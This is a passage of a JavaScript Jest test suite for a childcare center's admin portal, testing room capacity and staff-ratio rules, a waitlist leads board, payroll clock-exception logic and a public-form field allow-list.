        vm.createContext(sandbox);
        vm.runInContext(src, sandbox);
        return sandbox;
    }

    test('open seats are capacity minus booked, per room per day', () => {
        const m = load({ registrations: regs({ turtle: { '2026-09-14': 4 }, goose: { '2026-09-14': 5 } }) });
        const week = m._frWeekData(WEEK[0]);
        const mon = week.byDay[0];
        // (11 - 4) + (12 - 5) = 14
        expect(mon.open).toBe(14);
        expect(mon.booked).toBe(9);
        expect(mon.capacity).toBe(23);
    });

    // The whole point of the coral cells: a room sitting exactly on a ratio
    // boundary is NOT offered for release, however many seats look open.
    test('a room exactly on a ratio boundary is at-ratio and not releasable', () => {
        const m = load({ registrations: regs({ turtle: { '2026-09-14': 8 }, goose: { '2026-09-14': 7 } }) });
        const week = m._frWeekData(WEEK[0]);
        const turtle = week.rows.find(r => r.room.id === 'turtle').cells[0];
        const goose  = week.rows.find(r => r.room.id === 'goose').cells[0];
        expect(turtle.booked).toBe(8);          // 8 % 8 === 0 → the 9th child costs an adult
        expect(turtle.atRatio).toBe(true);
        expect(turtle.open).toBe(3);            // three seats open, still not releasable
        expect(turtle.releasable).toBe(false);
        expect(goose.atRatio).toBe(false);      // 7 % 8 !== 0
        expect(goose.releasable).toBe(true);
    });

    test('an empty room is not at ratio — zero children never costs an adult', () => {
        const m = load({ registrations: [] });
        const week = m._frWeekData(WEEK[0]);
        expect(week.rows[0].cells[0].atRatio).toBe(false);
        expect(week.rows[0].cells[0].releasable).toBe(true);
    });

    test('a closure removes the day from both sides of the occupancy fraction', () => {
        const m = load({
            registrations: regs({ turtle: { '2026-09-14': 4 }, goose: { '2026-09-14': 4 } }),
            closures: ['2026-09-16'],
        });
        const week = m._frWeekData(WEEK[0]);
        const wed = week.byDay[2];
        expect(wed.closed).toBe(true);
        expect(wed.open).toBe(0);
        expect(wed.capacity).toBe(0);           // not counted as unsold capacity
        expect(week.capacity).toBe(23 * 4);     // four open days, not five
    });

    test('waitlisted rows never count as booked', () => {
        const m = load({
            registrations: [{ room_id: 'turtle', registration_dates: [
                { care_date: '2026-09-14', waitlisted: true,  day_type: 'full' },
                { care_date: '2026-09-14', waitlisted: false, day_type: 'full' },
            ] }],
        });
        expect(m._frWeekData(WEEK[0]).byDay[0].booked).toBe(1);
    });

    test('seats-sold percentage and empty seat-days are two views of one number', () => {
        const m = load({ registrations: regs({ turtle: { '2026-09-14': 11 }, goose: { '2026-09-14': 12 } }) });
        const week = m._frWeekData(WEEK[0]);
        expect(week.open + week.booked).toBe(week.capacity);
        expect(week.soldPct).toBeCloseTo((week.booked / week.capacity) * 100, 6);
    });

    // "Thursday and Friday carry two-thirds of it" is derived from the week in
    // front of you, not asserted — a differently shaped week names its own
    // worst two days.
    test('the two emptiest open days are picked from the data, not hardcoded', () => {
        const m = load({ registrations: regs({
            turtle: { '2026-09-14': 11, '2026-09-15': 11, '2026-09-16': 1, '2026-09-17': 11, '2026-09-18': 2 },
            goose:  { '2026-09-14': 12, '2026-09-15': 12, '2026-09-16': 1, '2026-09-17': 12, '2026-09-18': 2 },
        }) });
        const week = m._frWeekData(WEEK[0]);
        expect(week.worst.includes('2026-09-16')).toBe(true);
        expect(week.worst.includes('2026-09-18')).toBe(true);
        expect(week.worst.includes('2026-09-14')).toBe(false);
        expect(week.worstShare).toBeGreaterThan(0.9);
    });

    // The funnel reads waitlist_applications' own columns. Every stage must be
    // a subset of the one above it, or the bars lie about where families stop.
    test('funnel stages are monotonic and read real application state', () => {
        const yr = new Date().getMonth() >= 6 ? new Date().getFullYear() : new Date().getFullYear() - 1;
        const when = `${yr}-08-01T00:00:00Z`;
        const m = load({ apps: [
            { applied_at: when, status: 'pending',  tour_status: 'not_scheduled' },
            { applied_at: when, status: 'pending',  tour_status: 'scheduled', tour_scheduled_at: when },
            { applied_at: when, status: 'offered',  tour_status: 'completed', offered_at: when },
            { applied_at: when, status: 'accepted', tour_status: 'completed', paperwork_received: false },
            { applied_at: when, status: 'enrolled', tour_status: 'completed' },
        ] });
        const f = m._frFunnel();
        const n = f.stages.map(s => s.n);
        expect(n[0]).toBe(5);                        // inquired
        expect(n[1]).toBe(4);                        // tour scheduled or beyond
        expect(n[2]).toBe(3);                        // toured
        expect(n[3]).toBe(3);                        // offered / accepted / enrolled
        expect(n[4]).toBe(1);                        // paperwork open
        expect(n[5]).toBe(1);                        // enrolled
        for (let i = 1; i < n.length - 2; i++) expect(n[i] <= n[i - 1]).toBe(true);
    });

    test('applications from before the program year are excluded', () => {
        const yr = new Date().getMonth() >= 6 ? new Date().getFullYear() : new Date().getFullYear() - 1;
        const m = load({ apps: [
            { applied_at: `${yr}-08-01T00:00:00Z`, status: 'pending' },
            { applied_at: `${yr - 1}-08-01T00:00:00Z`, status: 'pending' },
        ] });
        expect(m._frFunnel().total).toBe(1);
    });

    // Both layouts are built from the same data object. A ReferenceError in
    // either one only shows up when a director opens that density, which is
    // exactly the kind of thing a source-text assertion cannot catch —
    // so render both, against data that exercises every panel.
    test('both layouts render, with no undefined or NaN reaching the markup', () => {
        const yr = new Date().getMonth() >= 6 ? new Date().getFullYear() : new Date().getFullYear() - 1;
        const when = `${yr}-08-01T00:00:00Z`;
        const m = load({
            registrations: regs({
                turtle: { '2026-09-14': 8, '2026-09-15': 6, '2026-09-16': 5, '2026-09-17': 3, '2026-09-18': 2 },
                goose:  { '2026-09-14': 10, '2026-09-15': 9, '2026-09-16': 7, '2026-09-17': 4, '2026-09-18': 3 },
            }),
            apps: [
                { id: 1, applied_at: when, status: 'offered', child_name: 'Noah W', parent_name: 'Dana Whitfield',
                  offered_at: when, offer_deadline: new Date(Date.now() + 86400000).toLocaleDateString('en-CA'),
                  tour_status: 'completed', room_id: 'turtle' },
                { id: 2, applied_at: when, status: 'accepted', child_name: 'Camila R', parent_name: 'Ana Ruiz',
                  offered_at: when, paperwork_received: false, tour_status: 'completed', room_id: 'goose' },
                { id: 3, applied_at: when, status: 'pending', child_name: 'Arjun B', parent_name: 'Priya Bhatt',
                  tour_status: 'scheduled', tour_scheduled_at: `${yr}-08-20T00:00:00Z`, room_id: 'turtle' },
                { id: 4, applied_at: when, status: 'enrolled', child_name: 'Rowan I', parent_name: 'T Ives',
                  tour_status: 'completed', room_id: 'goose' },
            ],
        });
        const week = m._frWeekData(WEEK[0]);
        const funnel = m._frFunnel();
        const placeable = m._frPlaceableNow(null);
        const data = { week, funnel, alloc: null, placeable,
            forecast: m._frForecast(null, placeable), actions: m._frActions(week, funnel, null) };

        const dense = m._frDenseHtml(data);
        const calm  = m._frCalmHtml(data);
        expect(dense.length).toBeGreaterThan(2000);
        expect(calm.length).toBeGreaterThan(1000);
        expect(/undefined|NaN|\[object /.test(dense + calm)).toBe(false);
        // The queue found the real records, not an empty state.
        expect(data.actions.length).toBeGreaterThan(2);
    });

    // A brand-new center, or a week nobody has registered for yet, must render
    // an empty state rather than dividing by zero.
    test('an empty week renders without dividing by zero', () => {
        const m = load({ registrations: [], apps: [] });
        const week = m._frWeekData(WEEK[0]);
        const funnel = m._frFunnel();
        const data = { week, funnel, alloc: null, placeable: [],
            forecast: m._frForecast(null, []), actions: m._frActions(week, funnel, null) };
        expect(funnel.total).toBe(0);
        expect(funnel.stages[0].pct).toBe(100);         // the top of the funnel is always full-width
        expect(/undefined|NaN/.test(m._frDenseHtml(data) + m._frCalmHtml(data))).toBe(false);
    });

    // The drop-in release path has no table behind it yet. If someone wires a
    // button up without wiring the write, this fails.
    test('every drop-in action is still marked pending, not silently dead', () => {
        expect(src.includes('is-pending')).toBe(true);
        expect(/disabled/.test(src)).toBe(true);
        // No write call may appear in this module until the tables exist.
        expect(/sbClient\s*\.\s*from\(/.test(src)).toBe(false);
    });
});


// ============================================================
// THE AT-RATIO RULE — one rule, three surfaces
// (design handoff: Capacity & Fill, 1a/1b · 1c · 1d)
// ============================================================
// "One more child here costs another adult" is now decided in four places:
// apStaffing() for the director's staffing requirement, admin-fill-rooms.js
// for the release grid, parent-dropin.js for which days a parent is offered,
// and staff-room-head.js for the teacher's headroom line. They are separate
// bundles and cannot share a helper, so this is the drift guard AGENTS.md
// asks for over an intentional copy: all four must express the SAME rule, and
// a fifth copy appearing without a test is exactly what this catches.
describe('At-ratio — the same boundary on every screen', () => {
    const vm = require('vm');
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');

    const portal = read('js/admin/admin-portal.js');
    const fill   = read('js/admin/admin-fill-rooms.js');
    const parent = read('js/parent/parent-dropin.js');
    const staff  = read('js/staff/staff-room-head.js');
    const tour   = read('js/tour.js');

    // All four spell the boundary as "count % ratio === 0, and count > 0".
    // A room with nobody in it is not on a boundary — zero children have
    // never required an adult, and `0 % n === 0` is true, so the count>0
    // guard is the part that actually matters.
    test('every copy guards on count > 0, not just the modulo', () => {
        [['apStaffing', portal], ['fill rooms', fill], ['parent drop-in', parent],
         ['public tour page', tour]].forEach(([name, src]) => {
            const hit = /(\w+)\s*>\s*0\s*&&\s*\1\s*%\s*\w*[Rr]atio\w*\s*===\s*0/.test(src)
                     || /(\w+)\s*>\s*0\s*&&\s*\1\s*%\s*(\w+)\s*===\s*0/.test(src);
            if (!hit) throw new Error(`${name} does not guard the modulo on a positive count`);
        });
    });

    // The teacher's screen states the same fact the other way round — how
    // many more children fit before ceil() steps up — so it must agree at
    // the boundary rather than repeating the modulo.
    test('the teacher headroom line agrees with ceil(children / ratio)', () => {
        const sandbox = {
            console,
            ROOMS: [{ id: 'goose', label: '🪿 Goose Room', capacity: 12, staffRatio: 8 }],
            slRoomId: 'goose',
            slQueue: [],
            slEsc: s => String(s),
            document: { getElementById: () => null },
        };
        vm.createContext(sandbox);
        vm.runInContext(staff, sandbox);

        const kids = n => Array.from({ length: n }, () => ({ attendance_status: 'present' }));

        // 8 present, ratio 8 → one adult, and zero headroom: the 9th child
        // is the one that costs a second adult.
        let c = sandbox.srhCounts(kids(8));
        expect(c.present).toBe(8);
        expect(c.adults).toBe(1);
        expect(c.headroom).toBe(0);

        // 9 present → two adults, and seven more fit before a third.
        c = sandbox.srhCounts(kids(9));
        expect(c.adults).toBe(2);
        expect(c.headroom).toBe(7);

        // Nobody in the room is not a boundary.
        c = sandbox.srhCounts([]);
        expect(c.adults).toBe(0);

        // ceil(children / ratio) — the same expression apStaffing uses.
        for (let n = 1; n <= 24; n++) {
            expect(sandbox.srhCounts(kids(n)).adults).toBe(Math.ceil(n / 8));
        }
    });

    // A child who has gone home is not in the ratio. "Out" and "Not in" are
    // different facts everywhere else in this app (see slRenderRoster's own
    // note) and the ratio bar must not blend them back together.
    test('only children actually present count toward the ratio', () => {
        const sandbox = {
            console,
            ROOMS: [{ id: 'goose', capacity: 12, staffRatio: 8 }],
            slRoomId: 'goose', slQueue: [], slEsc: s => String(s),
            document: { getElementById: () => null },
        };
        vm.createContext(sandbox);
        vm.runInContext(staff, sandbox);
        const c = sandbox.srhCounts([
            { attendance_status: 'present' },
            { attendance_status: 'present' },
            { attendance_status: 'left' },
            { attendance_status: 'not_arrived' },
        ]);
        expect(c.present).toBe(2);
    });

    // The parent card must never offer a day the director's grid would keep
    // closed, and must never offer a day the child already holds.
    test('[at-ratio] the parent card offers only days the director would release', () => {
        const ROOM = { id: 'goose', label: '🪿 Goose Room', capacity: 12, staffRatio: 8, fullDayOnly: false, fullDayRate: 75, halfDayRate: 45 };
        // Three upcoming weekdays: one with room, one exactly on the ratio
        // boundary, one the child is already booked for.
        const FUTURE = [1, 2, 3].map(i => {
            const d = new Date(Date.now() + i * 86400000);
            return d.toLocaleDateString('en-CA');
        });
        const sandbox = {
            console,
            ROOMS: [ROOM],
            fetchCapacityForDates: async (_room, dates) => {
                const out = {};
                dates.forEach((d, i) => { out[d] = [5, 8, 5][i % 3]; });
                return out;
            },
            psDayRate: (room, t) => (t === 'half' ? room.halfDayRate : room.fullDayRate),
            psSchedule: async () => null,
            document: { getElementById: () => null },
        };
        vm.createContext(sandbox);
        vm.runInContext(parent, sandbox);
        // Force a deterministic date list rather than depending on which
        // weekday the suite happens to run on.
        sandbox.pdiUpcomingWeekdays = () => FUTURE.slice();

        const child = { id: 7, child_name: 'Ellie Reyes', room_id: 'goose' };
        const sched = { closures: [], registrations: [{ child_id: 7, dates: [{ care_date: FUTURE[2], waitlisted: false }] }] };

        return sandbox.pdiOpenDaysFor(child, sched).then(days => {
            const offered = days.map(d => d.date);
            expect(offered.includes(FUTURE[0])).toBe(true);   // 5 booked of 12, not on a boundary
            expect(offered.includes(FUTURE[1])).toBe(false);  // 8 booked, 8 % 8 === 0 → held back
            expect(offered.includes(FUTURE[2])).toBe(false);  // already booked by this child
        });
    });

    // Neither the parent card nor the teacher bar may write anything: the
    // release decision belongs to the office and has no table yet.
    test('neither the parent card nor the teacher bar writes to the database', () => {
        [parent, staff].forEach(src => {
            expect(/sbClient\s*\.\s*from\(/.test(src)).toBe(false);
            expect(/\.rpc\(/.test(src)).toBe(false);
        });
        // The parent card says so in as many words rather than rendering a
        // disabled submit.
        expect(parent.includes("Booking isn't open yet")).toBe(true);
    });

    // ⚠️ The security boundary this whole design turns on. The public submit
    // RPC's allow-list deliberately excludes tour_*, so a stranger cannot
    // write themselves onto the tour calendar — the office confirms from the
    // board instead. If the public page ever tries to set those fields, or
    // reaches waitlist_applications directly, this fails.
    test('the public tour page never writes an admin-controlled field', () => {
        const code = tour
            .replace(/\/\*[\s\S]*?\*\//g, '')
            .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
        // It submits through the allow-listed RPC, not a direct table write.
        expect(/submitWaitlistApplication\(/.test(code)).toBe(true);
        expect(/from\('waitlist_applications'\)/.test(code)).toBe(false);
        // And it never names a field the RPC would silently drop.
        ['tour_status', 'tour_scheduled_at', 'tour_completed_at', 'offered_at',
         'offer_deadline', 'paperwork_received', 'deposit_paid', 'applied_at']
            .forEach(f => {
                if (new RegExp(f + '\\s*:').test(code))
                    throw new Error(`tour.js sets ${f}, which submit_waitlist_application() drops`);
            });
        // The requested time rides in notes, which IS on the allow-list.
        expect(/TOUR REQUESTED/.test(code)).toBe(true);
    });

    // The allow-list itself must stay closed. If someone widens the migration
    // to let the public set tour_*, this is the test that should make them
    // stop and think about who the caller is.
    test('the public submit RPC still excludes every admin-controlled field', () => {
        const mig = readMigration('fix_public_waitlist_submit');
        const insert = /INSERT INTO waitlist_applications \(([\s\S]*?)\)\s*VALUES/.exec(mig);
        if (!insert) throw new Error('could not find the allow-list in the migration');
        const cols = insert[1];
        ['status', 'tour_status', 'tour_scheduled_at', 'offered_at', 'offer_deadline',
         'paperwork_received', 'deposit_paid', 'applied_at', 'archived_at']
            .forEach(f => {
                if (new RegExp('\\b' + f + '\\b').test(cols))
                    throw new Error(`${f} is reachable from the public internet`);
            });
    });
});


// ============================================================
// LEADS & TOURS — the board is a view, not a second table
// (design handoff: Capacity & Fill, turn 2a)
// ============================================================
// Every column is a predicate over waitlist_applications columns that already
// exist. The invariant that matters: the predicates must PARTITION — every
// active lead lands in exactly one column, so a family can never be in two
// places or vanish from the board entirely.
describe('Leads & Tours — column predicates partition every lead', () => {
    const vm = require('vm');
    const repoRoot = path.resolve(__dirname, '..', '..');
    const src = fs.readFileSync(path.join(repoRoot, 'js/admin/admin-leads.js'), 'utf8');

    function load(apps) {
        const sandbox = {
            console,
            _allWaitlistApps: apps || [],
            escHtml: s => String(s),
            calcAgeMonths: () => 30,
            wlDeriveRoom: a => a.room_id || 'turtle',
            wlRoomLabel: id => id,
            wlDaysLabel: () => 'Tue/Thu',
            FR_STALL_DAYS: 5,
            document: { getElementById: () => null },
            sbClient: null,
        };
        vm.createContext(sandbox);
        vm.runInContext(src, sandbox);
        return sandbox;
    }

    const old = new Date(Date.now() - 30 * 86400000).toISOString();
    const recent = new Date(Date.now() - 1 * 86400000).toISOString();
    const future = new Date(Date.now() + 2 * 86400000).toISOString();
    const past   = new Date(Date.now() - 2 * 86400000).toISOString();

    const CASES = [
        ['new',       { id: 1, status: 'pending',  applied_at: recent }],
        ['contacted', { id: 2, status: 'pending',  applied_at: old, confirmation_sent_at: old }],
        ['contacted', { id: 3, status: 'pending',  applied_at: old, reminder_count: 2 }],
        ['contacted', { id: 4, status: 'pending',  applied_at: old, still_interested_confirmed_at: recent }],
        ['tour',      { id: 5, status: 'pending',  applied_at: old, tour_status: 'scheduled', tour_scheduled_at: future }],
        ['toured',    { id: 6, status: 'pending',  applied_at: old, tour_status: 'completed', tour_completed_at: past }],
        ['offered',   { id: 7, status: 'offered',  applied_at: old, offered_at: old, offer_deadline: '2099-01-01' }],
        ['offered',   { id: 8, status: 'accepted', applied_at: old, paperwork_received: true }],
        ['offered',   { id: 9, status: 'enrolled', applied_at: old }],
    ];

    test('each state lands in the column its own record defines', () => {
        const m = load([]);
        CASES.forEach(([expected, app]) => {
            const got = m.ldColumnFor(app);
            if (got !== expected) throw new Error(`id ${app.id}: expected ${expected}, got ${got}`);
        });
    });

    // A family who has toured AND been offered is Offered, not Toured — the
    // later state wins, or a card would sit in two columns' worth of truth.
    test('later states win over earlier ones', () => {
        const m = load([]);
        expect(m.ldColumnFor({ status: 'offered', tour_status: 'completed', confirmation_sent_at: old })).toBe('offered');
        expect(m.ldColumnFor({ status: 'pending', tour_status: 'completed', tour_scheduled_at: past })).toBe('toured');
        expect(m.ldColumnFor({ status: 'pending', tour_status: 'scheduled', confirmation_sent_at: old })).toBe('tour');
    });

    test('every active lead lands in exactly one column', () => {
        const apps = CASES.map(([, a]) => a);
        const m = load(apps);
        const buckets = m.ldBuckets(apps);
        const total = Object.values(buckets).reduce((s, l) => s + l.length, 0);
        expect(total).toBe(apps.length);
        // No id appears twice across the five columns.
        const seen = new Set();
        Object.values(buckets).forEach(list => list.forEach(a => {
            if (seen.has(a.id)) throw new Error(`id ${a.id} is in two columns`);
            seen.add(a.id);
        }));
        expect(seen.size).toBe(apps.length);
    });

    // A declined or archived family is history, not a lead sitting on a board
    // for someone to chase.
    test('declined, expired and archived leads are off the board', () => {
        const apps = [
            { id: 1, status: 'pending',  applied_at: old },
            { id: 2, status: 'declined', applied_at: old },
            { id: 3, status: 'expired',  applied_at: old },
            { id: 4, status: 'archived', applied_at: old },
            { id: 5, status: 'pending',  applied_at: old, archived_at: old },
        ];
        const m = load(apps);
        expect(m.ldActive(apps).length).toBe(1);
        const total = Object.values(m.ldBuckets(apps)).reduce((s, l) => s + l.length, 0);
        expect(total).toBe(1);
    });

    // The conversion figure must divide by everyone who toured, including the
    // ones who toured and went elsewhere — otherwise it only ever reads 100%.
    test('tour → enrolled divides by everyone who toured, not just the wins', () => {
        const apps = [
            { id: 1, status: 'enrolled', applied_at: old, tour_status: 'completed' },
            { id: 2, status: 'accepted', applied_at: old, tour_status: 'completed' },
            { id: 3, status: 'declined', applied_at: old, tour_status: 'completed' },
            { id: 4, status: 'pending',  applied_at: old, tour_status: 'completed' },
        ];
        const m = load(apps);
        const metrics = m.ldMetrics(apps, m.ldBuckets(apps));
        expect(metrics.everToured.length).toBe(4);   // the declined one still toured
        expect(metrics.touredEnrolled).toBe(2);
        expect(metrics.convPct).toBe(50);
    });

    test('no tours and no leads reads as an empty state, not 0%', () => {
        const m = load([]);
        const metrics = m.ldMetrics([], m.ldBuckets([]));
        expect(metrics.convPct).toBeNull();
        expect(metrics.newThisWeek).toBe(0);
    });

    // "Gone quiet" must mean the same number of days here as on Fill the
    // Rooms — the two screens are describing the same families. The constant
    // is read off the source rather than the sandbox: a top-level `const` in
    // a vm script lives in the script's lexical scope and never becomes a
    // property of the context object (unlike a `function` declaration, which
    // is how every other module here is reached).
    test('the stall threshold is shared with Fill the Rooms, not redeclared', () => {
        const decl = /const\s+LD_STALL_DAYS\s*=([^;]+);/.exec(src);
        if (!decl) throw new Error('LD_STALL_DAYS is not declared');
        // It must DERIVE from Fill the Rooms' constant, not restate the number.
        expect(decl[1].includes('FR_STALL_DAYS')).toBe(true);
        expect(/\b5\b/.test(decl[1])).toBe(true);   // the fallback, for a bundle without it
    });

    // Log a call writes a real row, so it must NOT go through the public RPC
    // whose allow-list exists to constrain the public internet. Comments are
    // stripped first — the module header discusses that RPC by name, and a
    // naive source search would match the explanation of why it is not used.
    test('Log a call inserts directly and never through the public RPC', () => {
        const code = src
            .replace(/\/\*[\s\S]*?\*\//g, '')
            .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
        expect(/from\('waitlist_applications'\)\s*\.insert\(/.test(code)).toBe(true);
        expect(/submit_waitlist_application/.test(code)).toBe(false);
        // desired_start_date is NOT NULL on the table — an unknown start must
        // fall back rather than fail the insert.
        expect(/desired_start_date:/.test(code)).toBe(true);
    });
});


// ============================================================
// PAYROLL OVERVIEW — the three things that block an approval
// (design handoff: Capacity & Fill, 3a)
// ============================================================
// The exception panel is the point of this screen: it is the real reason a
// period is not ready. A false positive costs the director a phone call to a
// teacher about a shift that was fine, so each rule is tested at its edge.
describe('Payroll overview — clock exceptions and the pay calendar', () => {
    const vm = require('vm');
    const repoRoot = path.resolve(__dirname, '..', '..');
    const src = fs.readFileSync(path.join(repoRoot, 'js/admin/admin-payroll-home.js'), 'utf8');

    function load() {
        const sandbox = { console, escHtml: s => String(s), apInitials: () => 'XX',
            document: { getElementById: () => null, querySelectorAll: () => [] } };
        vm.createContext(sandbox);
        vm.runInContext(src, sandbox);
        return sandbox;
    }

    const staffById = new Map([[1, { name: 'Kiara Bell' }], [2, { name: 'Amy Mueller' }]]);
    const P = ['2026-09-01', '2026-09-14'];
    const ev = (staff_id, work_date, inH, outH) => ({
        staff_id, work_date,
        clock_in:  `${work_date}T${String(inH).padStart(2, '0')}:00:00`,
        clock_out: outH == null ? null : `${work_date}T${String(outH).padStart(2, '0')}:00:00`,
    });

    test('a shift clocked in and never out, on a day that is over, is flagged', () => {
        const m = load();
        const out = m._phExceptions([ev(1, '2026-09-10', 8, null)], [], staffById, ...P);
        expect(out.length).toBe(1);
        expect(out[0].kind).toBe('open');
        expect(out[0].name).toBe('Kiara Bell');
    });

    // The one false positive that would matter most: somebody who is on shift
    // right now has not clocked out yet, and that is not an exception.
    test("a shift still open TODAY is not an exception", () => {
        const m = load();
        const today = new Date().toLocaleDateString('en-CA');
        const out = m._phExceptions([ev(1, today, 8, null)], [], staffById, '2000-01-01', '2099-01-01');
        expect(out.length).toBe(0);
    });

    test('two shifts on one day are only flagged when they actually overlap', () => {
        const m = load();
        // Touching, not overlapping: out at 1pm, back in at 1pm.
        const touching = m._phExceptions(
            [ev(2, '2026-09-09', 8, 13), ev(2, '2026-09-09', 13, 15)], [], staffById, ...P);
        expect(touching.length).toBe(0);
        // Genuinely overlapping.
        const overlap = m._phExceptions(
            [ev(2, '2026-09-09', 8, 13), ev(2, '2026-09-09', 12, 15)], [], staffById, ...P);
        expect(overlap.length).toBe(1);
        expect(overlap[0].kind).toBe('overlap');
    });

    test('an overlap reports one row per person per day, not one per pair', () => {
        const m = load();
        const out = m._phExceptions(
            [ev(2, '2026-09-09', 8, 13), ev(2, '2026-09-09', 9, 14), ev(2, '2026-09-09', 10, 15)],
            [], staffById, ...P);
        expect(out.filter(e => e.kind === 'overlap').length).toBe(1);
    });

    // A week nobody built a schedule for is ONE missing schedule, not
    // seventeen exceptions — otherwise the panel is useless the first week.
    test('unscheduled hours are only flagged on days that have a schedule at all', () => {
        const m = load();
        const worked = [ev(1, '2026-09-08', 8, 15)];
        expect(m._phExceptions(worked, [], staffById, ...P).length).toBe(0);
        const withSchedule = [{ staff_id: 2, work_date: '2026-09-08', shift: 'AM' }];
        const out = m._phExceptions(worked, withSchedule, staffById, ...P);
        expect(out.length).toBe(1);
        expect(out[0].kind).toBe('unscheduled');
    });

    test('a scheduled person working their own shift is never flagged', () => {
        const m = load();
        const out = m._phExceptions(
            [ev(1, '2026-09-08', 8, 15)],
            [{ staff_id: 1, work_date: '2026-09-08', shift: 'AM' }], staffById, ...P);
        expect(out.length).toBe(0);
    });

    test('a short cover is not an exception', () => {
        const m = load();
        const out = m._phExceptions(
            [{ staff_id: 1, work_date: '2026-09-08',
               clock_in: '2026-09-08T08:00:00', clock_out: '2026-09-08T08:40:00' }],
            [{ staff_id: 2, work_date: '2026-09-08', shift: 'AM' }], staffById, ...P);
        expect(out.length).toBe(0);
    });

    test('exceptions outside the period are not this period’s problem', () => {
        const m = load();
        const out = m._phExceptions([ev(1, '2026-08-20', 8, null)], [], staffById, ...P);
        expect(out.length).toBe(0);
    });

    // Pay day is the Friday after a period closes; the cut-off the Tuesday
    // before that. Derived, not stored — so it must at least be internally
    // consistent and always land on those weekdays.
    test('pay day is always a Friday and the cut-off always the Tuesday before', () => {
        const m = load();
        ['2026-09-14', '2026-09-28', '2026-10-12', '2026-12-31', '2027-01-15'].forEach(end => {
            const pay = new Date(m._phPayDay(end) + 'T00:00:00');
            const cut = new Date(m._phCutoff(end) + 'T00:00:00');
            expect(pay.getDay()).toBe(5);                       // Friday
            expect(cut.getDay()).toBe(2);                       // Tuesday
            expect(pay > new Date(end + 'T00:00:00')).toBe(true);
            expect(cut < pay).toBe(true);
        });
    });

    // Manual hours are the office's correction; a clock pair for the same
    // person on the same day must not be added on top of it.
    test('a manual hours entry replaces the clock pair for that day, never adds to it', () => {
        const m = load();
        const hrs = m._phHoursByStaff(
            [ev(1, '2026-09-08', 8, 15), ev(1, '2026-09-09', 8, 12)],
            [{ staff_id: 1, work_date: '2026-09-08', hours_worked: '6' }]);
        // 6 manual for the 8th + 4 clocked on the 9th. NOT 6 + 7 + 4.
        expect(hrs.get(1)).toBe(10);
    });

    test('a clock pair under ten minutes is discarded, as in the period report', () => {
        const m = load();
        const hrs = m._phHoursByStaff([{ staff_id: 1, work_date: '2026-09-08',
            clock_in: '2026-09-08T08:00:00', clock_out: '2026-09-08T08:05:00' }], []);
        expect(hrs.get(1) || 0).toBe(0);
    });

    test('estimated gross pays salary per period and hourly by the hour', () => {
        const m = load();
        const hrs = new Map([[1, 10], [2, 20]]);
        const gross = m._phEstimatedGross([
            { id: 1, pay_type: 'hourly', hourly_rate: 15 },
            { id: 2, pay_type: 'salary', salary_biweekly: 2000, hourly_rate: 0 },
        ], hrs);
        expect(gross).toBe(150 + 2000);   // salaried hours do not add to it
    });

    // ⚠️ Regression, found live on main. The fetch span ran from the LAST
    // shown period's start to the FIRST one's end. `shown` is in calendar
    // order — [just closed, still running] — so that inverts the range, and
    // every .gte()/.lte() below it matches nothing.
    //
    // The failure is silent, which is what makes it worth a test: no error
    // and no empty state, just a fortnight of real work reading as zero
    // hours, no clock exceptions and $0 estimated gross, on the one screen
    // whose job is to say whether a period is ready to approve.
    test('the fetch span runs forwards, so a real period is not read as empty', async () => {
        const calls = [];
        const sandbox = {
            console, escHtml: s => String(s), apInitials: () => 'XX',
            // _payrollPeriodLabel is stubbed below, so the module never needs
            // the real month names — but it reads the global, so it has to exist.
            MONTH_NAMES: ['January', 'February', 'March', 'April', 'May', 'June', 'July',
                          'August', 'September', 'October', 'November', 'December'],
            document: { getElementById: () => null, querySelectorAll: () => [] },
            _buildPayrollPeriodList: () => [
                { start: '2026-08-18', end: '2026-08-31' },
                { start: '2026-09-01', end: '2026-09-14' },   // just closed
                { start: '2026-09-15', end: '2026-09-28' },   // still running
            ],
            _payrollPeriodLabel: (a, b) => `${a}-${b}`,
            fetchAllStaff: async () => [
                { id: 1, active: true, pay_type: 'hourly', hourly_rate: 15, name: 'Kiara Bell' }],
            // These behave the way PostgREST does: .gte(start).lte(end) with
            // start after end matches no rows at all.
            fetchClockEventsForRange: async (a, b) => {
                calls.push([a, b]);
                return a > b ? [] : [
                    { staff_id: 1, work_date: '2026-09-08',
                      clock_in: '2026-09-08T08:00:00Z', clock_out: '2026-09-08T15:00:00Z' },
                    { staff_id: 1, work_date: '2026-09-10',
                      clock_in: '2026-09-10T08:31:00Z', clock_out: null },
                ];
            },
            fetchStaffHours: async () => [],
            fetchStaffScheduleRange: async (a, b) => (a > b ? []
                : [{ staff_id: 1, work_date: '2026-09-08', shift: 'AM' }]),
            fetchTimeOffRequests: async () => [],
            fetchMdoPayrollApproval: async () => null,
        };
        vm.createContext(sandbox);
        vm.runInContext(src, sandbox);

        const d = await sandbox._phLoad();
        expect(calls[0][0] <= calls[0][1]).toBe(true);        // start before end

        const closed = d.rows.find(r => !r.open);
        expect(closed.hours).toBe(7);                          // 08:00-15:00
        expect(closed.people).toBe(1);
        expect(closed.gross).toBe(105);                        // 7h at $15
        expect(closed.exceptions.length).toBe(1);              // the open clock-out
    });

    // Benefits are the church office's, and the handoff is explicit that this
    // screen must not pretend to administer them.
    test('the church-office panel links out and never enrolls anyone', () => {
        expect(src.includes('Handled by the church office')).toBe(true);
        expect(/enroll/i.test(src.split('ph-church-list')[1] || '')).toBe(false);
    });
});


// ============================================================
// PROGRAMS — an add-on is not a room
// (design handoff: Capacity & Fill, 4d)
// ============================================================
// The invariant worth protecting: before/after care and camps must never
// leak into room capacity, the ratio math, the waitlist or the fill
// forecast. If someone ever "simplifies" this by adding a program to ROOMS,
// six morning children start appearing in the enrollment numbers and
// double-counting against the room the same child sits in at 9:01.
describe('Programs & add-ons — never a room', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const sb = read('js/supabase.js');

    test('no program id is also a ROOMS id', () => {
        const progIds = [...sb.matchAll(/^\s{8}id:\s*'([a-z_]+)',/gm)].map(m => m[1]);
        const roomsBlock = sb.slice(sb.indexOf('const ROOMS = ['), sb.indexOf('function getSortedRooms'));
        const roomIds = [...roomsBlock.matchAll(/id:\s*'([a-z_]+)'/g)].map(m => m[1]);
        ['before_care', 'after_care', 'camp'].forEach(id => {
